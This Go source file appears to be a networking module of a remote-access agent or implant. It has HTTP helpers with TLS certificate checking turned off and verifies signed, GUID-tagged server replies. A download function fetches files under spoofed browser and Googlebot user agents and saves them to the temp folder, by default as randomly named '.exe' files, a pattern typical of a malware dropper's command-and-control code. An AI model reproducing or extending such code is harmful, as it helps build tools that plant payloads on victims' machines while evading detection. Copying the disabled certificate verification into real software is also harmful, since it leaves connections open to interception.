package components

import (
	"bytes"
	"crypto/hmac"
	"crypto/tls"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"strconv"
	"time"
)

var clientHTTP = &http.Client{
	//Timeout: 10 * time.Second,
}

var clientHTTPS = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	},
	//Timeout: 10 * time.Second,
}

func get_client(useSSL bool) *http.Client {
	if useSSL {
		return clientHTTPS
	}
	return clientHTTP
}

func build_url(host string, path string, useSSL bool) string {
	var scheme string = "http://"

	if useSSL {
		scheme = "https://"
	}

	return scheme + host + path
}

func do_get(url string, useSSL bool) ([]byte, error) {
	client := get_client(useSSL)
	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return io.ReadAll(resp.Body)
}

func do_head_get(url string, headers map[string]string, useSSL bool) ([]byte, error) {
	client := get_client(useSSL)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return io.ReadAll(resp.Body)
}

func do_post(url string, data []byte, useSSL bool) ([]byte, error) {
	client := get_client(useSSL)

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return io.ReadAll(resp.Body)
}

func do_head_post(url string, body []byte, headers map[string]string, useSSL bool) *ServerReply {
	client := get_client(useSSL)

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(body))
	if err != nil {
		return nil
	}
	for k, v := range headers {
		req.Header.Add(k, v)
	}
	// Default use json format
	req.Header.Add("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil
	}

	reply := ServerReply{
		Args:    make(map[string]any),
		Headers: make(map[string]string),
	}
	guid := resp.Header.Get("X-Guid")
	timestamp := resp.Header.Get("X-Time")
	sign := resp.Header.Get("X-Sign")

	reply.Headers["X-Guid"] = guid
	reply.Headers["X-Time"] = timestamp
	reply.Headers["X-Sign"] = sign

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}
	err = json.Unmarshal(data, &reply)
	if err != nil {
		return nil
	}

	return &reply
}

func check_package_legality(pkg *ServerReply) bool {
	// Check GUID
	guid := pkg.Headers["X-Guid"]
	if guid != g_guid {
		log.Println("false GUID")
		return false
	}
	// Check timestamp
	time := pkg.Headers["X-Time"]
	time_server, _ := strconv.ParseInt(time, 10, 64)
	time_now := generate_utc_timestamp()
	if time_now-time_server >= 60*1000 {
		// Overtime
		log.Println("Timestamp overtime")
		return false
	}

	// Check HMAC
	byt, _ := base64_dec(g_token)
	client_hmac := hmac_sha256(byt, []byte(guid+time))
	base64_server_hmac := pkg.Headers["X-Sign"]
	server_hmac, _ := base64_dec(base64_server_hmac)
	if !hmac.Equal(client_hmac, server_hmac) {
		log.Println("false HMAC")
		return false
	}

	return true
}

func download_from_url(url, file_name string) string {
	// HTTP agent with overtime limitation
	client := &http.Client{
		Timeout: 20 * time.Second,
	}

	// Create a new HTTP GET request
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return ""
	}
	// Create a fake UA
	var UserAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 13; SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Electron/29.1.0 Chrome/122.0.0.0 Safari/537.36",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	}
	// Set HTTP header and send GET request
	req.Header.Set("User-Agent", UserAgents[g_seed.Intn(len(UserAgents))])
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	// Check statuscode of http response
	if resp.StatusCode != 200 {
		return ""
	}

	// Build save path
	final_file_path := ""
	temp_file_name := ""

	if file_name == "" {
		// If user doesn't specfiy file path, try to parse it from url
		temp_file_name = path.Base(resp.Request.URL.Path)
		if temp_file_name == "" || temp_file_name == "/" {
			// Oops, no? use default
			temp_file_name = random_string(random_int(5, 17)) + ".exe"
		}

	} else {
		temp_file_name = file_name
	}
	final_file_path = filepath.Join(os.TempDir(), temp_file_name)

	// Create file
	f, err := os.Create(final_file_path)
	if err != nil {
		return ""
	}
	defer f.Close()

	_, err = io.Copy(f, resp.Body)
	if err != nil {
		return ""
	}

	return final_file_path
}
